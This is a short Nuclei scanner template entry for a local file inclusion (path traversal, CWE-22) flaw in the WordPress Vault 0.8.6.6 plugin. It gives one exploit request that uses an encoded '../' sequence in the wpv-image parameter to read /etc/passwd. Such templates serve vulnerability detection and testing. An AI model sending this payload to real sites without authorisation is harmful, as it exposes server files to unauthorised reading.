# Nuclei Template: WordPress Vault 0.8.6.6 - Local File Inclusion
**Template ID:** wp-vault-local-file-inclusion
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-vault-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Vault 0.8.6.6 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## References
- https://www.exploit-db.com/exploits/40850
